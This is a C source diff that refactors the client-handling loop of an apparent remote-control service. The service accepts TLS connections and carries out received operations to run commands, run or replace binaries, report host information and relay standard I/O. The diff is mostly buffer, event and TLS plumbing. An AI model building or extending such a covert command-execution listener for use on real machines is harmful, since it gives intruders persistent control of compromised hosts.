@@ -1047,10 +1040,10 @@ static void htbt_lbd_srv_bin (
 
 	goto SND_STATUS;
 PROTO_ERR:
-	htbt_lbd_raise_protoerr(ctx, mh->id, 0);
+	htbt_slv_raise_protoerr(ctx, mh->id, 0);
 	goto END;
 SND_STATUS:
-	htbt_lbd_fab_status(
+	htbt_slv_fab_status(
 		ctx,
 		ret_status,
 		ret_errno,
@@ -1067,9 +1060,11 @@ END:
 	prne_free(args);
 	prne_close(fd);
 	pth_event_free(ev, FALSE);
+
+	return ret;
 }
 
-static void htbt_lbd_skip_inbuf (htbt_lbd_client_t *ctx) {
+static void htbt_slv_skip_inbuf (htbt_slv_ctx_t *ctx) {
 	size_t consume;
 
 	if (ctx->skip == 0) {
@@ -1083,20 +1078,16 @@ static void htbt_lbd_skip_inbuf (htbt_lbd_client_t *ctx) {
 	ctx->skip -= consume;
 }
 
-static bool htbt_lbd_consume_inbuf (
-	htbt_lbd_client_t *ctx,
+static bool htbt_slv_consume_inbuf (
+	htbt_slv_ctx_t *ctx,
 	pth_event_t root_ev)
 {
 	prne_htbt_ser_rc_t s_ret;
 	prne_htbt_msg_head_t f_head;
 	size_t actual;
-	bool ret = false;
+	bool ret = true;
 
-	prne_htbt_init_msg_head(&f_head);
-
-	while (ctx->valid) {
-		htbt_lbd_skip_inbuf(ctx);
-
+	while (ret && ctx->valid) {
 		prne_htbt_free_msg_head(&f_head);
 		prne_htbt_init_msg_head(&f_head);
 
@@ -1106,43 +1097,42 @@ static bool htbt_lbd_consume_inbuf (
 			&actual,
 			&f_head);
 		if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
+			ret = false;
 			break;
 		}
 		if (s_ret != PRNE_HTBT_SER_RC_OK ||
 			f_head.is_rsp ||
 			(f_head.op != PRNE_HTBT_OP_NOOP && f_head.id == 0))
 		{
-			htbt_lbd_raise_protoerr(ctx, f_head.id, 0);
+			htbt_slv_raise_protoerr(ctx, f_head.id, 0);
 			goto END;
 		}
 
 		f_head.is_rsp = true;
-		ret = true;
 		switch (f_head.op) {
 		case PRNE_HTBT_OP_NOOP:
 			prne_iobuf_shift(ctx->iobuf + 0, -actual);
 			break;
 		case PRNE_HTBT_OP_STDIO:
-			htbt_lbd_srv_stdio(ctx, root_ev, actual, &f_head);
+			ret = htbt_slv_srv_stdio(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_HOST_INFO:
-			htbt_lbd_srv_hostinfo(ctx, root_ev, actual, &f_head);
+			htbt_slv_srv_hostinfo(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_RUN_CMD:
-			htbt_lbd_srv_run_cmd(ctx, root_ev, actual, &f_head);
+			ret = htbt_slv_srv_run_cmd(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_RUN_BIN:
 		case PRNE_HTBT_OP_NY_BIN:
-			htbt_lbd_srv_bin(ctx, root_ev, actual, &f_head);
+			ret = htbt_slv_srv_bin(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_HOVER:
 		default:
-			htbt_lbd_raise_protoerr(
-				ctx,
-				f_head.id,
-				PRNE_HTBT_STATUS_UNIMPL);
+			htbt_slv_raise_protoerr(ctx, f_head.id, PRNE_HTBT_STATUS_UNIMPL);
 			goto END;
 		}
+
+		htbt_slv_skip_inbuf(ctx);
 	}
 
 END:
@@ -1151,115 +1141,241 @@ END:
 	return ret;
 }
 
-static void *htbt_lbd_client_entry (void *p) {
-	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)p;
-	int rw_size;
-	pth_event_t ev = NULL, ev_timeout = NULL;
-	struct pollfd pfd;
-	unsigned long ev_spec;
+static void *htbt_slv_entry (void *p) {
+	htbt_slv_ctx_t *ctx = (htbt_slv_ctx_t*)p;
+	int f_ret;
+	pth_event_t ev_timeout, ev_root = NULL;
+	struct pollfd pfd[2];
 
-	if (!htbt_lbd_client_handshake(ctx)) {
-		ctx->valid = false;
+	ev_timeout = pth_event(
+		PTH_EVENT_TIME,
+		prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
+	prne_assert(ev_timeout != NULL);
+	if (!ctx->setup_f(ctx->ioctx, ev_timeout)) {
+		goto END;
 	}
 
-	while (ctx->parent->loop_flag && ctx->valid) {
-		if (ctx->iobuf[1].len > 0) {
-			ev_spec =
-				PTH_EVENT_FD |
-				PTH_UNTIL_FD_READABLE |
-				PTH_UNTIL_FD_WRITEABLE |
-				PTH_UNTIL_FD_EXCEPTION;
-			pfd.events = POLLIN | POLLOUT;
-		}
-		else {
-			ev_spec =
-				PTH_EVENT_FD |
-				PTH_UNTIL_FD_READABLE |
-				PTH_UNTIL_FD_EXCEPTION;
-			pfd.events = POLLIN;
-		}
-
+	pfd[0].fd = ctx->fd[0];
+	pfd[1].fd = ctx->fd[1];
+	while (ctx->valid) {
 		if (ev_timeout == NULL) {
 			ev_timeout = pth_event(
 				PTH_EVENT_TIME,
-				prne_pth_tstimeout(HTBT_LBD_SCK_OP_TIMEOUT));
+				prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
 			prne_assert(ev_timeout != NULL);
 		}
-		pth_event_free(ev, FALSE);
-		ev = pth_event(
-			ev_spec,
-			ctx->fd);
-		prne_assert(ev != NULL);
-		pth_event_concat(ev, ev_timeout, NULL);
+		pth_event_free(ev_root, FALSE);
 
-		prne_assert(pth_mutex_acquire(&ctx->parent->lock, FALSE, ev));
-		pth_cond_await(&ctx->parent->cond, &ctx->parent->lock, ev);
-		pth_mutex_release(&ctx->parent->lock);
-		if (!ctx->parent->loop_flag) {
+		if (ctx->iobuf[1].len > 0) {
+			pfd[0].events = 0;
+			pfd[1].events = POLLOUT;
+			ev_root = pth_event(
+				PTH_EVENT_FD | PTH_UNTIL_FD_WRITEABLE | PTH_UNTIL_FD_EXCEPTION,
+				ctx->fd[1]);
+		}
+		else {
+			pfd[0].events = POLLIN;
+			pfd[1].events = 0;
+			ev_root = pth_event(
+				PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
+				ctx->fd[0]);
+		}
+		prne_assert(ev_root != NULL);
+		pth_event_concat(ev_root, ev_timeout, NULL);
+
+		prne_assert(pth_mutex_acquire(ctx->cv.lock, FALSE, ev_timeout));
+		pth_cond_await(ctx->cv.cond, ctx->cv.lock, ev_timeout);
+		pth_mutex_release(ctx->cv.lock);
+		if (!ctx->valid ||
+			pth_event_status(ev_timeout) == PTH_STATUS_OCCURRED)
+		{
 			break;
 		}
 
-		pfd.fd = ctx->fd;
-		if (poll(&pfd, 1, 0) == 1) {
-			if (!(pfd.revents & (POLLIN | POLLOUT))) {
-				break;
+		f_ret = poll(pfd, 2, 0);
+		if (f_ret < 0 && errno != EINTR) {
+			break;
+		}
+		else if (f_ret == 0) {
+			break;
+		}
+		else {
+			if (pfd[1].revents & POLLOUT) {
+				htbt_slv_consume_outbuf(ctx, 0, ev_timeout);
 			}
-
-			if (pfd.revents & POLLOUT) {
-				htbt_lbd_consume_outbuf(ctx, 0, ev_timeout);
-			}
-			if (pfd.revents & POLLIN) {
+			if (pfd[0].revents & POLLIN) {
 				if (ctx->iobuf[0].avail == 0) {
 					prne_dbgpf("** Malicious client?\n");
+					ctx->valid = false;
 					goto END;
 				}
-				rw_size = mbedtls_ssl_read(
-					&ctx->ssl,
+				f_ret = ctx->read_f(
+					ctx->ioctx,
 					ctx->iobuf[0].m + ctx->iobuf[0].len,
 					ctx->iobuf[0].avail);
-				if (rw_size <= 0) {
+				if (f_ret <= 0) {
+					ctx->valid = false;
 					break;
 				}
-				prne_iobuf_shift(ctx->iobuf + 0, rw_size);
+				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
 
-				if (htbt_lbd_consume_inbuf(ctx, ev_timeout)) {
+				if (htbt_slv_consume_inbuf(ctx, ev_timeout)) {
 					pth_event_free(ev_timeout, FALSE);
 					ev_timeout = NULL;
 				}
 			}
 		}
 	}
-	htbt_lbd_consume_outbuf(ctx, ctx->iobuf[1].len, ev_timeout);
 
 END:
-	pth_event_free(ev, TRUE);
-	htbt_lbd_proc_close(ctx);
+	pth_event_free(ev_timeout, FALSE);
+	ev_timeout = pth_event(
+		PTH_EVENT_TIME,
+		prne_pth_tstimeout(HTBT_CLOSE_TIMEOUT));
+	prne_assert(ev_timeout != NULL);
 
+	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, ev_timeout);
+	ctx->cleanup_f(ctx->ioctx, ev_timeout);
+
+	pth_event_free(ev_root, FALSE);
+	pth_event_free(ev_timeout, FALSE);
+
+	ctx->valid = false;
 	return NULL;
+}
+
+static void htbt_init_slv_ctx (htbt_slv_ctx_t *ctx) {
+	ctx->fd[0] = -1;
+	ctx->fd[1] = -1;
+	prne_init_iobuf(ctx->iobuf + 0);
+	prne_init_iobuf(ctx->iobuf + 1);
+	ctx->ioctx = NULL;
+	ctx->setup_f = NULL;
+	ctx->cleanup_f = NULL;
+	ctx->write_f = NULL;
+	ctx->read_f = NULL;
+	ctx->cbset = NULL;
+	ctx->cv.broadcast = false;
+	ctx->cv.lock = NULL;
+	ctx->cv.cond = NULL;
+	ctx->skip = 0;
+	ctx->valid = true;
+}
+
+static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
+	if (ctx == NULL) {
+		return;
+	}
+	prne_free_iobuf(ctx->iobuf + 0);
+	prne_free_iobuf(ctx->iobuf + 1);
+}
+
+static bool htbt_lbd_slv_setup_f(void *ioctx, pth_event_t ev) {
+	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
+
+	return prne_mbedtls_pth_handle(
+		&ctx->ssl,
+		mbedtls_ssl_handshake,
+		ctx->fd,
+		ev);
+}
+
+static void htbt_lbd_slv_cleanup_f(void *ioctx, pth_event_t ev) {
+	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
+
+	prne_mbedtls_pth_handle(&ctx->ssl, mbedtls_ssl_close_notify, ctx->fd, ev);
+	prne_shutdown(ctx->fd, SHUT_RDWR);
+}
+
+static int htbt_lbd_slv_read_f(void *ioctx, void *buf, const size_t len) {
+	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
+	return mbedtls_ssl_read(&ctx->ssl, (unsigned char*)buf, len);
+}
+
+static int htbt_lbd_slv_write_f(void *ioctx, const void *buf, const size_t len) {
+	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
+	return mbedtls_ssl_write(&ctx->ssl, (const unsigned char*)buf, len);
 }
 
 static void htbt_init_lbd_client (htbt_lbd_client_t *c) {
 	c->pth = NULL;
-	c->parent = NULL;
-	c->skip = 0;
-	prne_init_iobuf(c->iobuf + 0);
-	prne_init_iobuf(c->iobuf + 1);
-	c->fd = -1;
-	c->valid = true;
+	htbt_init_slv_ctx(&c->slv);
 	mbedtls_ssl_init(&c->ssl);
+	c->fd = -1;
+}
+
+static bool htbt_alloc_lbd_client (
+	htbt_lbd_client_t *c,
+	const int fd,
+	prne_htbt_t *parent)
+{
+	const size_t PAGESIZE = prne_getpagesize();
+	bool alloc;
+
+	c->fd = c->slv.fd[0] = c->slv.fd[1] = fd;
+	c->slv.ioctx = c;
+	c->slv.setup_f = htbt_lbd_slv_setup_f;
+	c->slv.cleanup_f = htbt_lbd_slv_cleanup_f;
+	c->slv.read_f = htbt_lbd_slv_read_f;
+	c->slv.write_f = htbt_lbd_slv_write_f;
+	c->slv.cbset = &parent->param.cb_f;
+	c->slv.cv.lock = &parent->lock;
+	c->slv.cv.cond = &parent->cond;
+
+	do {
+		// TODO: switch after testing
+		alloc = prne_alloc_iobuf(
+			c->slv.iobuf + 0,
+			PRNE_HTBT_PROTO_MIN_BUF);
+		alloc &= prne_alloc_iobuf(
+			c->slv.iobuf + 1,
+			PRNE_HTBT_PROTO_SUB_MIN_BUF);
+		if (alloc) {
+			break;
+		}
+
+		alloc = prne_alloc_iobuf(
+			c->slv.iobuf + 0,
+			PAGESIZE);
+		alloc &= prne_alloc_iobuf(
+			c->slv.iobuf + 1,
+			PAGESIZE);
+		if (alloc) {
+			break;
+		}
+
+		return false;
+	} while (false);
+
+	if (mbedtls_ssl_setup(&c->ssl, parent->param.lbd_ssl_conf) != 0) {
+		return false;
+	}
+	mbedtls_ssl_set_bio(
+		&c->ssl,
+		&c->fd,
+		prne_mbedtls_ssl_send_cb,
+		prne_mbedtls_ssl_recv_cb,
+		NULL);
+
+	c->pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_slv_entry, &c->slv);
+	if (c->pth == NULL) {
+		return false;
+	}
+
+	return true;
 }
 
 static void htbt_free_lbd_client (htbt_lbd_client_t *c) {
 	if (c == NULL) {
 		return;
 	}
-	pth_abort(c->pth);
-	prne_free_iobuf(c->iobuf + 0);
-	prne_free_iobuf(c->iobuf + 1);
-	prne_close(c->fd);
-	c->fd = -1;
+
+	if (c->pth != NULL) {
+		pth_abort(c->pth);
+	}
+	htbt_free_slv_ctx(&c->slv);
 	mbedtls_ssl_free(&c->ssl);
-	prne_free(c);
+	prne_close(c->fd);
 }
 
 static void htbt_lbd_setup_loop (prne_htbt_t *ctx) {
@@ -1331,25 +1447,23 @@ static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
 	pth_attr_t attr;
 	pth_state_t ths;
 	struct pollfd pfd;
-	const size_t PAGESIZE = prne_getpagesize();
 
 	while (ctx->loop_flag) {
-		if (ev == NULL) {
-			ev = pth_event(
-				PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
-				ctx->lbd.fd);
-			prne_assert(ev != NULL);
+		pth_event_free(ev, TRUE);
+		ev = pth_event(
+			PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
+			ctx->lbd.fd);
+		prne_assert(ev != NULL);
 
-			ent = ctx->lbd.conn_list.head;
-			while (ent != NULL) {
-				pth_event_t ev_sub = pth_event(
-					PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
-					((htbt_lbd_client_t*)ent->element)->pth);
-				prne_assert(ev_sub != NULL);
-				pth_event_concat(ev, ev_sub, NULL);
+		ent = ctx->lbd.conn_list.head;
+		while (ent != NULL) {
+			pth_event_t ev_sub = pth_event(
+				PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
+				((htbt_lbd_client_t*)ent->element)->pth);
+			prne_assert(ev_sub != NULL);
+			pth_event_concat(ev, ev_sub, NULL);
 
-				ent = ent->next;
-			}
+			ent = ent->next;
 		}
 
 		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
@@ -1370,11 +1484,11 @@ static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
 			if (ths == PTH_STATE_DEAD) {
 				pth_join(client->pth, NULL);
 				client->pth = NULL;
-				htbt_free_lbd_client(client);
-				ent = prne_llist_erase(&ctx->lbd.conn_list, ent);
 
-				pth_event_free(ev, TRUE);
-				ev = NULL;
+				htbt_free_lbd_client(client);
+				prne_free(client);
+
+				ent = prne_llist_erase(&ctx->lbd.conn_list, ent);
 			}
 			else {
 				ent = ent->next;
@@ -1383,27 +1497,18 @@ static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
 
 		pfd.fd = ctx->lbd.fd;
 		pfd.events = POLLIN;
-		if (poll(&pfd, 1, 0) == 1) {
+		if (poll(&pfd, 1, 0) > 0) {
 			if (!(pfd.revents & POLLIN)) {
 				break;
 			}
 
 			fret = accept(ctx->lbd.fd, NULL, NULL);
 			if (fret >= 0) {
-				pth_event_free(ev, TRUE);
-				ev = NULL;
+				bool alloc;
+
 				client = NULL;
 				ent = NULL;
 				do { // TRY
-					const size_t IOBUF_SIZE[2][2] = {
-						// TODO: switch after testing
-						{
-							PRNE_HTBT_PROTO_MIN_BUF,
-							PRNE_HTBT_PROTO_SUB_MIN_BUF },
-						{ PAGESIZE, PAGESIZE }
-					};
-					bool alloc;
-
 					client = (htbt_lbd_client_t*)prne_malloc(
 						sizeof(htbt_lbd_client_t),
 						1);
@@ -1412,64 +1517,29 @@ static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
 					}
 					htbt_init_lbd_client(client);
 
-					for (size_t i = 0; i < 2; i += 1) {
-						alloc =
-							prne_alloc_iobuf(
-								client->iobuf + 0,
-								IOBUF_SIZE[i][0]) &&
-							prne_alloc_iobuf(
-								client->iobuf + 1,
-								IOBUF_SIZE[i][1]);
-						if (alloc) {
-							break;
-						}
-					}
+					alloc = htbt_alloc_lbd_client(client, fret, ctx);
+					fret = -1;
 					if (!alloc) {
 						goto CATCH;
 					}
-
-					client->parent = ctx;
-					client->fd = fret;
-					if (mbedtls_ssl_setup(
-						&client->ssl,
-						ctx->param.lbd_ssl_conf) != 0)
-					{
-						goto CATCH;
-					}
-					mbedtls_ssl_set_bio(
-						&client->ssl,
-						&client->fd,
-						prne_mbedtls_ssl_send_cb,
-						prne_mbedtls_ssl_recv_cb,
-						NULL);
 
 					ent = prne_llist_append(&ctx->lbd.conn_list, client);
 					if (ent == NULL) {
 						goto CATCH;
 					}
 
-					client->pth = pth_spawn(
-						PTH_ATTR_DEFAULT,
-						htbt_lbd_client_entry,
-						client);
-					if (client->pth == NULL) {
-						goto CATCH;
-					}
-
-					pth_event_free(ev, TRUE);
-					ev = NULL;
-
 					break;
 CATCH:				// CATCH
 					if (ent != NULL) {
 						prne_llist_erase(&ctx->lbd.conn_list, ent);
-						ent = NULL;
 					}
 					if (client != NULL) {
 						htbt_free_lbd_client(client);
 					}
 					prne_close(fret);
 				} while (false);
+				client = NULL;
+				ent = NULL;
 			}
 		}
 	}
@@ -1482,6 +1552,9 @@ CATCH:				// CATCH
 		ent = ent->next;
 
 		pth_join(client->pth, NULL);
+		client->pth = NULL;
+
+		htbt_free_lbd_client(client);
 		prne_free(client);
 	}
 	prne_llist_clear(&ctx->lbd.conn_list);
